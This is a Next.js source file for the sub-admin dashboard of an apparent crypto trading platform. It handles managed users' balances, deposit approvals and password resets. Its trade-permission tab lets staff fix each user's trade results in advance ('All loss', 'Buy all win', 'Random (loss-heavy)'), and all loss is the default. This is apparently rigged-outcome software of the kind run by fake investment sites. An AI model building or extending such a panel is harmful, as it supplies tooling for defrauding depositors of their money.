// app/subadmin/page.tsx
"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useSearchParams } from "next/navigation";
import MiningPendingTable from "@/app/admin/components/MiningPendingTable";
import WithdrawRequestsPanel from "@/app/admin/components/WithdrawRequestsPanel";
import NotifyPanel from "@/app/admin/components/NotifyPanel";
import SupportChatPanel from "@/app/admin/components/SupportChatPanel";

type Asset = "USDT" | "BTC" | "ETH" | "SOL" | "XRP";
type TradePermissionMode = "BUY_ALL_WIN" | "SELL_ALL_WIN" | "RANDOM_WIN_LOSS" | "ALL_LOSS";

type UserRow = {
  id: string;
  username?: string | null;
  email?: string | null;
  phone?: string | null;
  managed_by?: string | null;
  managed_by_username?: string | null;
  balance?: number | null;
  usdt?: number | null;
  btc?: number | null;
  eth?: number | null;
  sol?: number | null;
  xrp?: number | null;
  created_at?: string | null;
};

type UsersResp = {
  users?: UserRow[];
  error?: string;
};

type TradePermissionUser = {
  id: string;
  username?: string | null;
  email?: string | null;
  permissionMode?: TradePermissionMode;
  buyEnabled?: boolean;
  sellEnabled?: boolean;
  source?: "db" | "memory" | "default";
};

type TradePermissionListResp = {
  users?: TradePermissionUser[];
  error?: string;
};

type TradePermissionUpdateResp = {
  ok?: boolean;
  error?: string;
  permissionMode?: TradePermissionMode;
  buyEnabled?: boolean;
  sellEnabled?: boolean;
};

type DepositRequestRow = {
  id: string;
  userId: string;
  adminId?: string | null;
  username?: string | null;
  email?: string | null;
  asset: Asset;
  amount: number;
  walletAddress: string;
  status: "PENDING" | "CONFIRMED" | "REJECTED";
  createdAt: string;
};

type DepositRequestListResp = {
  ok?: boolean;
  error?: string;
  pendingCount?: number;
  requests?: DepositRequestRow[];
};

type DepositRequestActionResp = {
  ok?: boolean;
  error?: string;
  pendingCount?: number;
  request?: DepositRequestRow;
};

type PasswordResetResp = {
  ok?: boolean;
  error?: string;
  generated?: boolean;
  temporaryPassword?: string | null;
};

async function readJson<T>(res: Response): Promise<T> {
  try {
    return (await res.json()) as T;
  } catch {
    return {} as T;
  }
}

function fmtAsset(v: number | null | undefined, asset: Asset) {
  const n = Number(v ?? 0);
  const maxFractionDigits = asset === "USDT" ? 2 : 8;
  return n.toLocaleString(undefined, { maximumFractionDigits: maxFractionDigits });
}

function fmtDateTime(v?: string | null) {
  if (!v) return "-";
  const d = new Date(v);
  if (Number.isNaN(d.getTime())) return "-";
  return d.toLocaleString();
}

function fmtManagedBy(user: UserRow) {
  const id = String(user.managed_by || "");
  const name = String(user.managed_by_username || "").trim();
  if (!id) return "-";
  if (name) return `${name} (${id.slice(0, 8)}...)`;
  return `${id.slice(0, 10)}...`;
}

const PERMISSION_MODE_OPTIONS: Array<{ value: TradePermissionMode; label: string }> = [
  { value: "BUY_ALL_WIN", label: "Buy all win" },
  { value: "SELL_ALL_WIN", label: "Sell all win" },
  { value: "RANDOM_WIN_LOSS", label: "All random win/loss" },
  { value: "ALL_LOSS", label: "All loss" },
];

function normalizePermissionMode(v: unknown): TradePermissionMode {
  const raw = String(v || "").trim().toUpperCase();
  if (raw === "BUY_ALL_WIN" || raw === "SELL_ALL_WIN" || raw === "RANDOM_WIN_LOSS" || raw === "ALL_LOSS") {
    return raw as TradePermissionMode;
  }
  return "ALL_LOSS";
}

function permissionModeLabel(mode: TradePermissionMode) {
  if (mode === "BUY_ALL_WIN") return "Buy all win";
  if (mode === "SELL_ALL_WIN") return "Sell all win";
  if (mode === "RANDOM_WIN_LOSS") return "All random win/loss";
  return "All loss";
}

function permissionSessionLabel(mode: TradePermissionMode) {
  if (mode === "BUY_ALL_WIN") return "BUY win / SELL loss";
  if (mode === "SELL_ALL_WIN") return "SELL win / BUY loss";
  if (mode === "RANDOM_WIN_LOSS") return "Random (loss-heavy)";
  return "BUY+SELL loss";
}

export default function SubAdminPage() {
  const sp = useSearchParams();
  const tab = (sp.get("tab") || "overview").toLowerCase();

  const [loading, setLoading] = useState(false);
  const [err, setErr] = useState("");
  const [users, setUsers] = useState<UserRow[]>([]);

  const [permissionUsers, setPermissionUsers] = useState<TradePermissionUser[]>([]);
  const [permissionLoading, setPermissionLoading] = useState(false);
  const [permissionErr, setPermissionErr] = useState("");
  const [permissionSavingUserId, setPermissionSavingUserId] = useState("");
  const [depositRequests, setDepositRequests] = useState<DepositRequestRow[]>([]);
  const [depositRequestsLoading, setDepositRequestsLoading] = useState(false);
  const [depositRequestsErr, setDepositRequestsErr] = useState("");
  const [depositRequestsInfo, setDepositRequestsInfo] = useState("");
  const [depositRequestActionId, setDepositRequestActionId] = useState("");
  const [pendingDepositCount, setPendingDepositCount] = useState(0);
  const [depositRequestUserFilter, setDepositRequestUserFilter] = useState("ALL");
  const [passwordResetSavingUserId, setPasswordResetSavingUserId] = useState("");
  const [passwordResetErr, setPasswordResetErr] = useState("");
  const [passwordResetInfo, setPasswordResetInfo] = useState("");

  async function reloadUsers() {
    setLoading(true);
    setErr("");

    try {
      const r = await fetch("/api/admin/users", { cache: "no-store" });
      const j = await readJson<UsersResp>(r);
      if (!r.ok) throw new Error(j?.error || "Failed to load users");
      setUsers(Array.isArray(j?.users) ? j.users : []);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Network error";
      setErr(message);
    } finally {
      setLoading(false);
    }
  }

  const fetchDepositRequests = useCallback(async (userId?: string) => {
    const params = new URLSearchParams();
    params.set("status", "PENDING");
    params.set("limit", "300");
    if (userId) params.set("userId", userId);

    const r = await fetch(`/api/admin/deposit-requests?${params.toString()}`, {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<DepositRequestListResp>(r);
    if (!r.ok || !j?.ok) {
      throw new Error(j?.error || "Failed to load deposit requests");
    }

    return {
      requests: Array.isArray(j?.requests) ? j.requests : [],
      pendingCount: Number(j?.pendingCount ?? 0),
    };
  }, []);

  const reloadDepositRequests = useCallback(async () => {
    setDepositRequestsLoading(true);
    setDepositRequestsErr("");
    try {
      const result = await fetchDepositRequests();
      setDepositRequests(result.requests);
      setPendingDepositCount(result.pendingCount);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load deposit requests";
      setDepositRequestsErr(message);
    } finally {
      setDepositRequestsLoading(false);
    }
  }, [fetchDepositRequests]);

  async function processDepositRequest(requestId: string, action: "APPROVE" | "DECLINE") {
    setDepositRequestActionId(requestId);
    setDepositRequestsErr("");
    setDepositRequestsInfo("");
    try {
      const r = await fetch("/api/admin/deposit-requests", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, action }),
      });

      const j = await readJson<DepositRequestActionResp>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || `Failed to ${action.toLowerCase()} request`);
      }

      setDepositRequests((prev) => prev.filter((x) => x.id !== requestId));
      setPendingDepositCount(Number(j?.pendingCount ?? 0));
      setDepositRequestsInfo(
        action === "APPROVE" ? "Deposit request approved and credited." : "Deposit request declined."
      );

      await reloadUsers();
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : `Failed to ${action.toLowerCase()} request`;
      setDepositRequestsErr(message);
    } finally {
      setDepositRequestActionId("");
    }
  }

  const fetchPermissionUsers = useCallback(async () => {
    const r = await fetch("/api/admin/trade-permission", {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<TradePermissionListResp>(r);
    if (!r.ok) throw new Error(j?.error || "Failed to load trade permissions");
    const rows = Array.isArray(j?.users) ? j.users : [];
    return rows.map((u) => ({
      ...u,
      permissionMode: normalizePermissionMode(u.permissionMode),
    }));
  }, []);

  const reloadPermissionUsers = useCallback(async () => {
    setPermissionLoading(true);
    setPermissionErr("");

    try {
      const rows = await fetchPermissionUsers();
      setPermissionUsers(rows);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load trade permissions";
      setPermissionErr(message);
    } finally {
      setPermissionLoading(false);
    }
  }, [fetchPermissionUsers]);

  async function savePermission(userId: string, permissionMode: TradePermissionMode) {
    setPermissionSavingUserId(userId);
    setPermissionErr("");
    try {
      const r = await fetch("/api/admin/trade-permission", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, permissionMode }),
      });
      const j = await readJson<TradePermissionUpdateResp>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to save permission");
      }
      const savedMode = normalizePermissionMode(j?.permissionMode || permissionMode);
      setPermissionUsers((prev) =>
        prev.map((u) =>
          u.id === userId
            ? {
                ...u,
                permissionMode: savedMode,
              }
            : u
        )
      );
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to save permission";
      setPermissionErr(message);
    } finally {
      setPermissionSavingUserId("");
    }
  }

  useEffect(() => {
    if (tab !== "topups" && tab !== "overview") return;
    void reloadUsers();
    if (tab === "topups") {
      void reloadDepositRequests();
    }
  }, [tab, reloadDepositRequests]);

  useEffect(() => {
    if (tab !== "orders") return;
    void reloadPermissionUsers();
  }, [tab, reloadPermissionUsers]);

  const pendingByUserId = useMemo(() => {
    const map = new Map<string, number>();
    depositRequests.forEach((r) => {
      const key = String(r.userId || "");
      if (!key) return;
      map.set(key, (map.get(key) ?? 0) + 1);
    });
    return map;
  }, [depositRequests]);
  const requestUserOptions = useMemo(() => {
    const seen = new Set<string>();
    const rows: Array<{ id: string; label: string }> = [];

    depositRequests.forEach((r) => {
      const id = String(r.userId || "").trim();
      if (!id || seen.has(id)) return;
      seen.add(id);
      const matched = users.find((u) => u.id === id);
      const username = String(r.username || matched?.username || id.slice(0, 8));
      const email = String(r.email || matched?.email || "").trim();
      rows.push({
        id,
        label: email ? `${username} (${email})` : username,
      });
    });

    return rows;
  }, [depositRequests, users]);
  const filteredDepositRequests = useMemo(() => {
    if (depositRequestUserFilter === "ALL") return depositRequests;
    return depositRequests.filter((r) => r.userId === depositRequestUserFilter);
  }, [depositRequestUserFilter, depositRequests]);

  useEffect(() => {
    if (depositRequestUserFilter === "ALL") return;
    const stillExists = depositRequests.some((r) => r.userId === depositRequestUserFilter);
    if (!stillExists) {
      setDepositRequestUserFilter("ALL");
    }
  }, [depositRequestUserFilter, depositRequests]);

  const resetUserPassword = async (u: UserRow) => {
    const input = window.prompt(
      "Set new password. Leave blank and press OK to auto-generate a temporary password (min 8 chars).",
      ""
    );
    if (input === null) return;

    const nextPassword = String(input || "").trim();
    if (nextPassword.length > 0 && nextPassword.length < 8) {
      setPasswordResetErr("New password must be at least 8 characters.");
      setPasswordResetInfo("");
      return;
    }

    setPasswordResetSavingUserId(u.id);
    setPasswordResetErr("");
    setPasswordResetInfo("");

    try {
      const r = await fetch("/api/admin/reset-user-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: u.id,
          newPassword: nextPassword || undefined,
        }),
      });
      const j = await readJson<PasswordResetResp>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to reset password");
      }

      const label = u.username ?? u.email ?? "User";
      if (j.generated && j.temporaryPassword) {
        setPasswordResetInfo(`Temporary password for ${label}: ${j.temporaryPassword}`);
      } else {
        setPasswordResetInfo(`Password reset completed for ${label}.`);
      }
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to reset password";
      setPasswordResetErr(message);
    } finally {
      setPasswordResetSavingUserId("");
    }
  };

  return (
    <div>
      <div className="mb-5 flex items-start justify-between gap-3">
        <div>
          <div className="text-2xl font-semibold">
            {tab === "overview"
              ? "Overview"
              : tab === "topups"
                ? "Deposit Permission"
                : tab === "mining"
                  ? "Mining Pending"
                  : tab === "orders"
                    ? "Trade Permission"
                    : tab === "withdraw"
                      ? "Withdraw Info"
                      : tab === "notify"
                        ? "Notify"
                        : "Support"}
          </div>
          <div className="mt-1 text-sm text-white/60">Sub-admin dashboard (managed users only)</div>
        </div>

        <div className="rounded-full border border-white/10 bg-white/5 px-3 py-1 text-sm">
          Role: <b>Sub-admin</b>
        </div>
      </div>

      {tab === "overview" && (
        <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
          <div className="mb-4 flex items-center justify-between gap-2">
            <div>
              <div className="text-xl font-semibold">Overview</div>
              <div className="mt-1 text-sm text-white/60">
                Managed users with balance, email, managed-by and created time.
              </div>
            </div>
            <button
              type="button"
              onClick={() => void reloadUsers()}
              className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
            >
              Refresh
            </button>
          </div>

          {loading ? <div className="text-white/60">Loading...</div> : null}
          {err ? <div className="text-red-400">{err}</div> : null}
          {passwordResetErr ? <div className="mb-3 text-sm text-red-300">{passwordResetErr}</div> : null}
          {passwordResetInfo ? <div className="mb-3 text-sm text-emerald-300">{passwordResetInfo}</div> : null}

          {!loading && !err ? (
            <div className="overflow-x-auto rounded-xl border border-white/10">
              <table className="w-full min-w-[1060px]">
                <thead className="bg-white/5 text-left text-white/60">
                  <tr>
                    <th className="px-3 py-3">USER</th>
                    <th className="px-3 py-3">EMAIL</th>
                    <th className="px-3 py-3 text-right">BALANCE (USDT)</th>
                    <th className="px-3 py-3">MANAGED BY</th>
                    <th className="px-3 py-3">CREATED AT</th>
                    <th className="px-3 py-3 text-right">ACTION</th>
                  </tr>
                </thead>
                <tbody>
                  {users.map((u) => {
                    const isResetting = passwordResetSavingUserId === u.id;
                    return (
                      <tr key={u.id} className="border-t border-white/10">
                        <td className="px-3 py-3">{u.username || "-"}</td>
                        <td className="px-3 py-3">{u.email || "-"}</td>
                        <td className="px-3 py-3 text-right">{fmtAsset(u.usdt ?? u.balance, "USDT")}</td>
                        <td className="px-3 py-3">{fmtManagedBy(u)}</td>
                        <td className="px-3 py-3">{fmtDateTime(u.created_at)}</td>
                        <td className="px-3 py-3 text-right">
                          <button
                            type="button"
                            onClick={() => void resetUserPassword(u)}
                            disabled={isResetting}
                            className="rounded-full bg-blue-600 px-4 py-2 text-sm font-semibold text-white disabled:opacity-60 hover:bg-blue-500"
                          >
                            {isResetting ? "Resetting..." : "Reset Password"}
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                  {users.length === 0 ? (
                    <tr>
                      <td className="px-3 py-6 text-white/60" colSpan={6}>
                        No users found.
                      </td>
                    </tr>
                  ) : null}
                </tbody>
              </table>
            </div>
          ) : null}
        </div>
      )}

      {tab === "topups" && (
        <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
          <div className="mb-4 flex items-center justify-between gap-3">
            <div>
              <div className="flex items-center gap-2 text-base font-semibold">
                Deposit Permission
                <span className="inline-flex min-w-6 items-center justify-center rounded-full bg-rose-500 px-2 py-0.5 text-xs font-semibold text-white">
                  {pendingDepositCount}
                </span>
              </div>
              <div className="mt-1 text-sm text-white/60">
                Approve or decline pending requests for your invited users.
              </div>
            </div>
            <button
              type="button"
              onClick={() => void reloadDepositRequests()}
              className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
            >
              {depositRequestsLoading ? "Refreshing..." : "Refresh Requests"}
            </button>
          </div>

          <div className="mb-6 rounded-2xl border border-white/10 bg-black/20 p-4">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div>
                <div className="text-base font-semibold">Deposit Request Queue</div>
                <div className="mt-1 text-xs text-white/60">
                  Approve or decline pending deposit requests.
                </div>
              </div>

              <div className="flex items-center gap-2">
                <label className="text-xs text-white/60" htmlFor="sub-topups-deposit-request-user-filter">
                  User
                </label>
                <select
                  id="sub-topups-deposit-request-user-filter"
                  value={depositRequestUserFilter}
                  onChange={(e) => setDepositRequestUserFilter(e.target.value)}
                  className="rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-xs text-white outline-none"
                >
                  <option value="ALL" className="bg-black">
                    All pending
                  </option>
                  {requestUserOptions.map((opt) => (
                    <option key={opt.id} value={opt.id} className="bg-black">
                      {opt.label}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {filteredDepositRequests.length === 0 ? (
              <div className="mt-3 rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-sm text-white/60">
                No pending deposit requests for this filter.
              </div>
            ) : (
              <div className="mt-3 overflow-x-auto">
                <table className="w-full min-w-[900px]">
                  <thead>
                    <tr className="text-left text-xs uppercase tracking-wide text-white/55">
                      <th className="py-2">User</th>
                      <th className="py-2">Email</th>
                      <th className="py-2">Asset</th>
                      <th className="py-2 text-right">Amount</th>
                      <th className="py-2">Wallet</th>
                      <th className="py-2">Requested</th>
                      <th className="py-2 pr-1 text-right">Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredDepositRequests.map((req) => {
                      const user = users.find((u) => u.id === req.userId);
                      const username = req.username || user?.username || "-";
                      const email = req.email || user?.email || "-";

                      return (
                        <tr key={req.id} className="border-t border-white/10 text-sm">
                          <td className="py-2">{username}</td>
                          <td className="py-2">{email}</td>
                          <td className="py-2">{req.asset}</td>
                          <td className="py-2 text-right">{fmtAsset(req.amount, req.asset)}</td>
                          <td className="max-w-[220px] py-2 text-xs text-white/70 break-all">{req.walletAddress}</td>
                          <td className="py-2 text-xs text-white/70">{fmtDateTime(req.createdAt)}</td>
                          <td className="py-2 pr-1 text-right">
                            <div className="inline-flex max-w-[220px] flex-wrap justify-end gap-2">
                              <button
                                type="button"
                                disabled={depositRequestActionId === req.id}
                                onClick={() => void processDepositRequest(req.id, "APPROVE")}
                                className="rounded-lg bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60"
                              >
                                {depositRequestActionId === req.id ? "Processing..." : "Approve"}
                              </button>
                              <button
                                type="button"
                                disabled={depositRequestActionId === req.id}
                                onClick={() => void processDepositRequest(req.id, "DECLINE")}
                                className="rounded-lg bg-rose-600 px-3 py-1.5 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60"
                              >
                                {depositRequestActionId === req.id ? "Processing..." : "Decline"}
                              </button>
                            </div>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          {loading ? <div className="text-white/60">Loading...</div> : null}
          {err ? <div className="text-red-400">{err}</div> : null}
          {depositRequestsErr ? <div className="mb-3 text-red-300">{depositRequestsErr}</div> : null}
          {depositRequestsInfo ? <div className="mb-3 text-emerald-300">{depositRequestsInfo}</div> : null}

          {!loading && !err && (
            <>
              <div className="overflow-x-auto">
                <table className="w-full min-w-[980px]">
                  <thead>
                    <tr className="text-left text-white/60">
                      <th className="py-3">USERNAME</th>
                      <th className="py-3">EMAIL</th>
                      <th className="py-3 text-right">USDT</th>
                      <th className="py-3 text-right">BTC</th>
                      <th className="py-3 text-right">ETH</th>
                      <th className="py-3 text-right">SOL</th>
                      <th className="py-3 text-right">XRP</th>
                      <th className="py-3 pr-1 text-right">REQUESTS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {users.map((u) => {
                      const pendingCount = pendingByUserId.get(u.id) ?? 0;
                      return (
                        <tr key={u.id} className="border-t border-white/10">
                          <td className="py-3">{u.username || "-"}</td>
                          <td className="py-3">{u.email || "-"}</td>
                          <td className="py-3 text-right">{fmtAsset(u.usdt ?? u.balance, "USDT")}</td>
                          <td className="py-3 text-right">{fmtAsset(u.btc, "BTC")}</td>
                          <td className="py-3 text-right">{fmtAsset(u.eth, "ETH")}</td>
                          <td className="py-3 text-right">{fmtAsset(u.sol, "SOL")}</td>
                          <td className="py-3 text-right">{fmtAsset(u.xrp, "XRP")}</td>
                          <td className="py-3 pr-1 text-right">
                            <div className="inline-flex max-w-[220px] flex-wrap items-center justify-end gap-2">
                              {pendingCount > 0 ? (
                                <button
                                  type="button"
                                  onClick={() => setDepositRequestUserFilter(u.id)}
                                  className="rounded-full border border-rose-400/40 bg-rose-500/15 px-3 py-1.5 text-xs font-semibold text-rose-200 whitespace-nowrap"
                                >
                                  Requests {pendingCount}
                                </button>
                              ) : (
                                <span className="text-xs text-white/45">-</span>
                              )}
                            </div>
                          </td>
                        </tr>
                      );
                    })}
                    {users.length === 0 ? (
                      <tr>
                        <td className="py-6 text-white/60" colSpan={8}>
                          No users found.
                        </td>
                      </tr>
                    ) : null}
                  </tbody>
                </table>
              </div>

            </>
          )}
        </div>
      )}

      {tab === "mining" && (
        <MiningPendingTable />
      )}

      {tab === "orders" && (
        <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
          <div className="mb-4 text-xl font-semibold">Trade Permissions</div>
          <div className="mb-4 text-sm text-white/60">
            Select a trade permission mode for each managed user.
          </div>

          {permissionLoading ? <div className="text-white/60">Loading...</div> : null}
          {permissionErr ? <div className="mb-3 text-red-400">{permissionErr}</div> : null}

          {!permissionLoading && (
            <div className="overflow-x-auto">
              <table className="w-full min-w-[760px]">
                <thead>
                  <tr className="text-left text-white/60">
                    <th className="py-3">USER</th>
                    <th className="py-3">EMAIL</th>
                    <th className="py-3">SESSION</th>
                    <th className="py-3">PERMISSION</th>
                    <th className="py-3 text-right">ACTION</th>
                  </tr>
                </thead>
                <tbody>
                  {permissionUsers.map((u) => (
                    <tr key={u.id} className="border-t border-white/10">
                      <td className="py-3">{u.username ?? "-"}</td>
                      <td className="py-3">
                        <div>{u.email ?? "-"}</div>
                        <div className="mt-1 text-xs text-white/45">
                          {permissionModeLabel(normalizePermissionMode(u.permissionMode))}
                        </div>
                      </td>
                      <td className="py-3">
                        <span className="rounded-lg border border-white/10 bg-black/30 px-2 py-1 text-xs text-white/80">
                          {permissionSessionLabel(normalizePermissionMode(u.permissionMode))}
                        </span>
                      </td>
                      <td className="py-3">
                        <select
                          value={normalizePermissionMode(u.permissionMode)}
                          onChange={(e) => {
                            const mode = normalizePermissionMode(e.target.value);
                            setPermissionUsers((prev) =>
                              prev.map((x) => (x.id === u.id ? { ...x, permissionMode: mode } : x))
                            );
                          }}
                          className="w-full rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-sm text-white outline-none focus:ring-2 focus:ring-blue-500/30"
                        >
                          {PERMISSION_MODE_OPTIONS.map((opt) => (
                            <option key={opt.value} value={opt.value}>
                              {opt.label}
                            </option>
                          ))}
                        </select>
                      </td>
                      <td className="py-3 text-right">
                        <button
                          type="button"
                          disabled={permissionSavingUserId === u.id}
                          onClick={() => void savePermission(u.id, normalizePermissionMode(u.permissionMode))}
                          className="rounded-xl bg-blue-600 px-4 py-2 text-sm font-semibold text-white disabled:opacity-60"
                        >
                          {permissionSavingUserId === u.id ? "Saving..." : "Save"}
                        </button>
                      </td>
                    </tr>
                  ))}
                  {permissionUsers.length === 0 ? (
                    <tr>
                      <td className="py-6 text-white/60" colSpan={5}>
                        No users found.
                      </td>
                    </tr>
                  ) : null}
                </tbody>
              </table>
            </div>
          )}

          <button
            type="button"
            onClick={() => void reloadPermissionUsers()}
            className="mt-4 rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
          >
            Refresh Permissions
          </button>
        </div>
      )}

      {tab === "withdraw" && <WithdrawRequestsPanel readOnly />}

      {tab === "notify" && <NotifyPanel />}

      {tab === "support" && <SupportChatPanel />}
    </div>
  );
}
